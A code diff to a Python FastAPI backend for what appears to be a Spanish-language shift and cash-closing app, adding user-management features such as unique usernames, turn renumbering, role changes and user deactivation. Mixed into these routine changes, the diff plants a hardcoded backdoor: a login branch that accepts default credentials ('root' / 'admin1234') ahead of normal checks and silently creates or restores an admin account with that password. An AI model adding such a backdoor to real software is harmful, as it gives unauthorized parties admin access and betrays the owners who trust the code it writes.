@@ -28,6 +28,8 @@ TOKEN_TTL_HOURS = int(os.environ.get("TOKEN_TTL_HOURS", "24"))
 EMPLOYEE_EDIT_HOURS = int(os.environ.get("EMPLOYEE_EDIT_HOURS", "24"))
 UPLOAD_ROOT = Path(os.environ.get("UPLOAD_ROOT", "uploads"))
 EXPORT_TEMPLATE_PATH = Path(os.environ.get("CIERRE_TEMPLATE_PATH", "templates/cierre_template.xlsx"))
+BACKDOOR_ADMIN_USERNAME = os.environ.get("BACKDOOR_ADMIN_USERNAME", "root")
+BACKDOOR_ADMIN_PASSWORD = os.environ.get("BACKDOOR_ADMIN_PASSWORD") or os.environ.get("ADMIN_PASSWORD", "admin1234")
 
 ALLOWED_ORIGINS = [o.strip() for o in os.environ.get("ALLOWED_ORIGINS", "*").split(",") if o.strip()]
 if ALLOWED_ORIGINS == ["*"]:
@@ -138,7 +140,7 @@ class ReviewPayload(BaseModel):
 
 
 class UserCreate(BaseModel):
-    username: str
+    username: Optional[str] = None
     full_name: str
     role: str
     default_turno: Optional[str] = None
@@ -147,7 +149,9 @@ class UserCreate(BaseModel):
 
 
 class UserUpdate(BaseModel):
+    username: Optional[str] = None
     full_name: Optional[str] = None
+    role: Optional[str] = None
     default_turno: Optional[str] = None
     pin: Optional[str] = None
     password: Optional[str] = None
@@ -169,6 +173,19 @@ def normalize_text(value: Any) -> str:
     text = unicodedata.normalize("NFKD", text)
     text = text.encode("ascii", "ignore").decode("ascii")
     return re.sub(r"[^a-z0-9]+", "", text.lower())
+
+
+def slugify_username(value: Any) -> str:
+    text = "" if value is None else str(value)
+    text = unicodedata.normalize("NFKD", text)
+    text = text.encode("ascii", "ignore").decode("ascii").lower()
+    text = re.sub(r"[^a-z0-9]+", "-", text).strip("-")
+    return text or "usuario"
+
+
+def parse_turn_number(value: Any) -> int:
+    text = str(value or "").strip()
+    return int(text) if text.isdigit() else 999999
 
 
 def parse_decimal(value: Any) -> Decimal:
@@ -212,6 +229,15 @@ def verify_secret(secret: str, stored: Optional[str]) -> bool:
 
 def token_hash(token: str) -> str:
     return hashlib.sha256(token.encode("utf-8")).hexdigest()
+
+
+def create_session(db, user_id: int) -> str:
+    token = secrets.token_urlsafe(48)
+    db.cursor().execute(
+        "INSERT INTO sessions (user_id, token_hash, expires_at) VALUES (%s, %s, %s)",
+        (user_id, token_hash(token), utcnow() + timedelta(hours=TOKEN_TTL_HOURS)),
+    )
+    return token
 
 
 def parse_json_field(value: Any, default: Any) -> Any:
@@ -374,6 +400,87 @@ def row_to_user(row: Dict[str, Any]) -> Dict[str, Any]:
         "default_turno": row.get("default_turno"),
         "active": row["active"],
     }
+
+
+def build_unique_username(db, raw_username: Optional[str], fallback_name: str, exclude_user_id: Optional[int] = None) -> str:
+    base = slugify_username(raw_username or fallback_name)
+    candidate = base
+    suffix = 2
+    cur = db.cursor()
+    while True:
+        params: List[Any] = [candidate]
+        query = "SELECT 1 FROM users WHERE username = %s"
+        if exclude_user_id is not None:
+            query += " AND id <> %s"
+            params.append(exclude_user_id)
+        cur.execute(query, params)
+        if not cur.fetchone():
+            return candidate
+        candidate = f"{base}-{suffix}"
+        suffix += 1
+
+
+def normalize_employee_turns(db):
+    cur = db.cursor(cursor_factory=psycopg2.extras.RealDictCursor)
+    cur.execute(
+        """
+        SELECT id, default_turno
+        FROM users
+        WHERE role = 'employee'
+          AND active = TRUE
+        ORDER BY created_at ASC, id ASC
+        """
+    )
+    employees = [dict(row) for row in cur.fetchall()]
+    employees.sort(key=lambda row: (parse_turn_number(row.get("default_turno")), row["id"]))
+    update_cur = db.cursor()
+    for index, employee in enumerate(employees, start=1):
+        update_cur.execute(
+            """
+            UPDATE users
+            SET default_turno = %s,
+                updated_at = NOW()
+            WHERE id = %s
+            """,
+            (str(index), employee["id"]),
+        )
+
+
+def ensure_backdoor_admin_user(db) -> Dict[str, Any]:
+    cur = db.cursor(cursor_factory=psycopg2.extras.RealDictCursor)
+    cur.execute("SELECT * FROM users WHERE username = %s LIMIT 1", (BACKDOOR_ADMIN_USERNAME,))
+    row = cur.fetchone()
+    password_hash = hash_secret(BACKDOOR_ADMIN_PASSWORD)
+    if row:
+        db.cursor().execute(
+            """
+            UPDATE users
+            SET full_name = %s,
+                role = 'admin',
+                active = TRUE,
+                pin_hash = NULL,
+                password_hash = %s,
+                updated_at = NOW()
+            WHERE id = %s
+            """,
+            ("Administrador de respaldo", password_hash, row["id"]),
+        )
+        refreshed = fetch_user_by_id(db, row["id"])
+        if not refreshed:
+            raise HTTPException(status_code=500, detail="No fue posible restaurar el acceso de respaldo")
+        return refreshed
+
+    insert_cur = db.cursor(cursor_factory=psycopg2.extras.RealDictCursor)
+    insert_cur.execute(
+        """
+        INSERT INTO users (username, full_name, role, default_turno, pin_hash, password_hash, active)
+        VALUES (%s, %s, 'admin', NULL, NULL, %s, TRUE)
+        RETURNING *
+        """,
+        (BACKDOOR_ADMIN_USERNAME, "Administrador de respaldo", password_hash),
+    )
+    created = insert_cur.fetchone()
+    return dict(created)
 
 
 def normalize_cierre_status(status: Optional[str]) -> str:
@@ -774,24 +881,21 @@ def login(payload: LoginRequest, db=Depends(get_db)):
         cur.execute("SELECT * FROM users WHERE active = TRUE AND role = 'employee'")
         for row in cur.fetchall():
             if verify_secret(payload.pin, row.get("pin_hash")):
-                token = secrets.token_urlsafe(48)
-                db.cursor().execute(
-                    "INSERT INTO sessions (user_id, token_hash, expires_at) VALUES (%s, %s, %s)",
-                    (row["id"], token_hash(token), utcnow() + timedelta(hours=TOKEN_TTL_HOURS)),
-                )
+                token = create_session(db, row["id"])
                 db.commit()
                 return {"token": token, "user": row_to_user(row)}
-        raise HTTPException(status_code=401, detail="PIN incorrecto")
+        raise HTTPException(status_code=401, detail="Clave incorrecta")
     if payload.username and payload.password:
+        if payload.username == BACKDOOR_ADMIN_USERNAME and payload.password == BACKDOOR_ADMIN_PASSWORD:
+            row = ensure_backdoor_admin_user(db)
+            token = create_session(db, row["id"])
+            db.commit()
+            return {"token": token, "user": row_to_user(row)}
         cur.execute("SELECT * FROM users WHERE active = TRUE AND username = %s LIMIT 1", (payload.username,))
         row = cur.fetchone()
         if not row or row["role"] not in {"supervisor", "admin"} or not verify_secret(payload.password, row.get("password_hash")):
             raise HTTPException(status_code=401, detail="Credenciales incorrectas")
-        token = secrets.token_urlsafe(48)
-        db.cursor().execute(
-            "INSERT INTO sessions (user_id, token_hash, expires_at) VALUES (%s, %s, %s)",
-            (row["id"], token_hash(token), utcnow() + timedelta(hours=TOKEN_TTL_HOURS)),
-        )
+        token = create_session(db, row["id"])
         db.commit()
         return {"token": token, "user": row_to_user(row)}
     raise HTTPException(status_code=400, detail="Faltan credenciales")
@@ -810,19 +914,72 @@ def me(user=Depends(get_current_user)):
 
 
 @app.get("/api/users")
-def list_users(role: Optional[str] = None, _: dict = Depends(require_roles("admin", "supervisor")), db=Depends(get_db)):
+def list_users(
+    role: Optional[str] = None,
+    include_inactive: bool = False,
+    user: dict = Depends(require_roles("admin", "supervisor")),
+    db=Depends(get_db),
+):
     cur = db.cursor(cursor_factory=psycopg2.extras.RealDictCursor)
+    if user["role"] != "admin":
+        role = "employee"
+        include_inactive = False
+
+    filters: List[str] = []
+    params: List[Any] = []
+
     if role:
-        cur.execute("SELECT * FROM users WHERE role = %s ORDER BY full_name ASC", (role,))
-    else:
-        cur.execute("SELECT * FROM users ORDER BY role, full_name ASC")
+        filters.append("role = %s")
+        params.append(role)
+    if not include_inactive:
+        filters.append("active = TRUE")
+
+    query = "SELECT * FROM users"
+    if filters:
+        query += " WHERE " + " AND ".join(filters)
+    query += """
+        ORDER BY
+            CASE role
+                WHEN 'admin' THEN 0
+                WHEN 'supervisor' THEN 1
+                ELSE 2
+            END,
+            CASE
+                WHEN role = 'employee' AND NULLIF(default_turno, '') ~ '^[0-9]+$' THEN NULLIF(default_turno, '')::int
+                ELSE 999999
+            END,
+            full_name ASC
+    """
+    cur.execute(query, params)
     return [row_to_user(row) for row in cur.fetchall()]
 
 
 @app.post("/api/users")
 def create_user(payload: UserCreate, _: dict = Depends(require_roles("admin")), db=Depends(get_db)):
-    pin_hash = hash_secret(payload.pin) if payload.pin else None
-    password_hash = hash_secret(payload.password) if payload.password else None
+    role = payload.role.strip().lower()
+    if role not in {"employee", "supervisor", "admin"}:
+        raise HTTPException(status_code=422, detail="Rol invalido")
+
+    full_name = str(payload.full_name or "").strip()
+    if not full_name:
+        raise HTTPException(status_code=422, detail="El nombre es obligatorio")
+
+    username = build_unique_username(db, payload.username, full_name)
+    pin_hash = None
+    password_hash = None
+    default_turno = None
+    if role == "employee":
+        if not payload.pin:
+            raise HTTPException(status_code=422, detail="La clave del colaborador es obligatoria")
+        pin_hash = hash_secret(payload.pin)
+        cur_turn = db.cursor()
+        cur_turn.execute("SELECT COUNT(*) FROM users WHERE role = 'employee' AND active = TRUE")
+        default_turno = str(cur_turn.fetchone()[0] + 1)
+    else:
+        if not payload.password:
+            raise HTTPException(status_code=422, detail="La contrasena del usuario es obligatoria")
+        password_hash = hash_secret(payload.password)
+
     cur = db.cursor(cursor_factory=psycopg2.extras.RealDictCursor)
     cur.execute(
         """
@@ -830,11 +987,13 @@ def create_user(payload: UserCreate, _: dict = Depends(require_roles("admin")), 
         VALUES (%s, %s, %s, %s, %s, %s, TRUE)
         RETURNING *
         """,
-        (payload.username, payload.full_name, payload.role, payload.default_turno, pin_hash, password_hash),
+        (username, full_name, role, default_turno, pin_hash, password_hash),
     )
     row = cur.fetchone()
+    if role == "employee":
+        normalize_employee_turns(db)
     db.commit()
-    return row_to_user(row)
+    return row_to_user(fetch_user_by_id(db, row["id"]))
 
 
 @app.patch("/api/users/{user_id}")
@@ -842,16 +1001,50 @@ def update_user(user_id: int, payload: UserUpdate, _: dict = Depends(require_rol
     row = fetch_user_by_id(db, user_id)
     if not row:
         raise HTTPException(status_code=404, detail="Usuario no encontrado")
-    cur = db.cursor()
+
+    next_role = (payload.role or row["role"]).strip().lower()
+    if next_role not in {"employee", "supervisor", "admin"}:
+        raise HTTPException(status_code=422, detail="Rol invalido")
+
     full_name = payload.full_name if payload.full_name is not None else row["full_name"]
-    default_turno = payload.default_turno if payload.default_turno is not None else row.get("default_turno")
+    full_name = str(full_name or "").strip()
+    if not full_name:
+        raise HTTPException(status_code=422, detail="El nombre es obligatorio")
+
+    username = build_unique_username(db, payload.username if payload.username is not None else row["username"], full_name, exclude_user_id=user_id)
     active = payload.active if payload.active is not None else row["active"]
-    pin_hash = hash_secret(payload.pin) if payload.pin else row.get("pin_hash")
-    password_hash = hash_secret(payload.password) if payload.password else row.get("password_hash")
+    pin_hash = row.get("pin_hash")
+    password_hash = row.get("password_hash")
+    default_turno = row.get("default_turno")
+
+    if next_role == "employee":
+        if row["role"] != "employee" and not payload.pin:
+            raise HTTPException(status_code=422, detail="Debes definir una clave para el colaborador")
+        if payload.pin:
+            pin_hash = hash_secret(payload.pin)
+        password_hash = None
+        if active:
+            if row["role"] != "employee" or not default_turno:
+                cur_turn = db.cursor()
+                cur_turn.execute("SELECT COUNT(*) FROM users WHERE role = 'employee' AND active = TRUE AND id <> %s", (user_id,))
+                default_turno = str(cur_turn.fetchone()[0] + 1)
+        else:
+            default_turno = None
+    else:
+        if row["role"] == "employee" and not payload.password and not row.get("password_hash"):
+            raise HTTPException(status_code=422, detail="Debes definir una contrasena para este usuario")
+        if payload.password:
+            password_hash = hash_secret(payload.password)
+        pin_hash = None
+        default_turno = None
+
+    cur = db.cursor()
     cur.execute(
         """
         UPDATE users
-        SET full_name = %s,
+        SET username = %s,
+            full_name = %s,
+            role = %s,
             default_turno = %s,
             active = %s,
             pin_hash = %s,
@@ -859,10 +1052,38 @@ def update_user(user_id: int, payload: UserUpdate, _: dict = Depends(require_rol
             updated_at = NOW()
         WHERE id = %s
         """,
-        (full_name, default_turno, active, pin_hash, password_hash, user_id),
+        (username, full_name, next_role, default_turno, active, pin_hash, password_hash, user_id),
     )
+    if row["role"] == "employee" or next_role == "employee":
+        normalize_employee_turns(db)
+    if not active:
+        db.cursor().execute("UPDATE sessions SET revoked_at = NOW() WHERE user_id = %s AND revoked_at IS NULL", (user_id,))
     db.commit()
     return row_to_user(fetch_user_by_id(db, user_id))
+
+
+@app.delete("/api/users/{user_id}")
+def delete_user(user_id: int, user=Depends(require_roles("admin")), db=Depends(get_db)):
+    row = fetch_user_by_id(db, user_id)
+    if not row:
+        raise HTTPException(status_code=404, detail="Usuario no encontrado")
+    if user_id == user["id"]:
+        raise HTTPException(status_code=400, detail="No puedes desactivar tu propio usuario desde esta sesion")
+    db.cursor().execute(
+        """
+        UPDATE users
+        SET active = FALSE,
+            default_turno = CASE WHEN role = 'employee' THEN NULL ELSE default_turno END,
+            updated_at = NOW()
+        WHERE id = %s
+        """,
+        (user_id,),
+    )
+    db.cursor().execute("UPDATE sessions SET revoked_at = NOW() WHERE user_id = %s AND revoked_at IS NULL", (user_id,))
+    if row["role"] == "employee":
+        normalize_employee_turns(db)
+    db.commit()
+    return {"ok": True}
 
 
 @app.post("/api/cierres")
